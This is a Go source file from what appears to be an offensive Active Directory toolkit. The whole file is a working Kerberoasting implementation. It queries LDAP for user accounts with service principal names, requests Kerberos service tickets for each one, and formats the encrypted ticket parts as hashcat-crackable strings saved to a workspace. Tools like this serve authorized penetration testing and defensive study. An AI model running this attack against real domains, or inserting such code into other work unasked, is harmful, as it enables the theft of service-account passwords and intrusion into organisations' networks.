package kerberos

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/go-ldap/ldap/v3"
	krbclient "github.com/jcmturner/gokrb5/v8/client"

	"github.com/MKlolbullen/AD-plower/internal/config"
	"github.com/MKlolbullen/AD-plower/internal/workspace"
)

// SPN mirrors unauth.SPN without importing that package, to avoid an
// unauth → kerberos → unauth cycle.
type SPN struct {
	User string `json:"user"`
	SPN  string `json:"spn"`
}

// KerberoastResult is the output of a run: one hash per crackable SPN plus
// any errors that prevented recovering a TGS. Hashes are in hashcat -m 13100
// (RC4) format, which is what every modern AD forest still mints.
type KerberoastResult struct {
	SPNs   []SPN             `json:"spns"`
	Hashes map[string]string `json:"hashes"`
	Errors map[string]string `json:"errors"`
}

func domainToBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	for i, p := range parts {
		parts[i] = "DC=" + p
	}
	return strings.Join(parts, ",")
}

// RunKerberoast discovers SPN-bound user accounts via authenticated LDAP,
// requests a TGS for each one, and emits the encrypted portion as a hashcat
// string. Requires valid domain credentials.
func RunKerberoast(dc string) (*KerberoastResult, error) {
	if config.Cfg.Username == "" || config.Cfg.Password == "" {
		return nil, fmt.Errorf("kerberoast requires authenticated credentials")
	}
	if dc == "" {
		return nil, fmt.Errorf("kerberoast: dc required")
	}
	res := &KerberoastResult{Hashes: map[string]string{}, Errors: map[string]string{}}

	spns, err := findKerberoastable(dc, config.Cfg.Domain)
	if err != nil {
		return nil, err
	}
	res.SPNs = spns

	realm := strings.ToUpper(config.Cfg.Domain)
	krb5conf := buildKrbConf(realm, dc)
	cl := krbclient.NewWithPassword(config.Cfg.Username, realm, config.Cfg.Password, krb5conf, krbclient.DisablePAFXFAST(true))
	if err := cl.Login(); err != nil {
		return res, fmt.Errorf("kerberos login: %w", err)
	}
	defer cl.Destroy()

	for _, s := range spns {
		tkt, _, err := cl.GetServiceTicket(s.SPN)
		if err != nil {
			res.Errors[s.User] = err.Error()
			continue
		}
		hash, err := formatKerberoastHash(s.User, realm, tkt.EncPart.Cipher)
		if err != nil {
			res.Errors[s.User] = err.Error()
			continue
		}
		res.Hashes[s.User] = hash
	}

	workspace.Patch(func(r *workspace.ReconResults) {
		if r.TGSHashes == nil {
			r.TGSHashes = map[string]string{}
		}
		for u, h := range res.Hashes {
			r.TGSHashes[u] = h
		}
		for _, s := range spns {
			r.SPNs = append(r.SPNs, workspace.SPNInfo{User: s.User, SPN: s.SPN})
		}
	})
	workspace.Save("kerberoast", res)
	return res, nil
}

// formatKerberoastHash emits a hashcat -m 13100 compatible string. The
// cipher layout is <16-byte checksum><encrypted payload>, matching the RC4
// TGS response body.
func formatKerberoastHash(user, realm string, cipher []byte) (string, error) {
	if len(cipher) < 16 {
		return "", fmt.Errorf("tgs cipher too short")
	}
	var b bytes.Buffer
	fmt.Fprintf(&b, "$krb5tgs$23$*%s$%s$*$", user, realm)
	b.WriteString(hex.EncodeToString(cipher[:16]))
	b.WriteString("$")
	b.WriteString(hex.EncodeToString(cipher[16:]))
	return b.String(), nil
}

func findKerberoastable(dc, domain string) ([]SPN, error) {
	conn, err := ldap.DialURL(fmt.Sprintf("ldap://%s:389", dc))
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	user := config.Cfg.Username + "@" + domain
	if err := conn.Bind(user, config.Cfg.Password); err != nil {
		return nil, fmt.Errorf("bind: %w", err)
	}
	sr, err := conn.SearchWithPaging(ldap.NewSearchRequest(
		domainToBaseDN(domain),
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
		"(&(samAccountType=805306368)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))",
		[]string{"sAMAccountName", "servicePrincipalName"},
		nil,
	), 500)
	if err != nil {
		return nil, err
	}
	var out []SPN
	for _, e := range sr.Entries {
		name := e.GetAttributeValue("sAMAccountName")
		for _, spn := range e.GetAttributeValues("servicePrincipalName") {
			out = append(out, SPN{User: name, SPN: spn})
		}
	}
	return out, nil
}
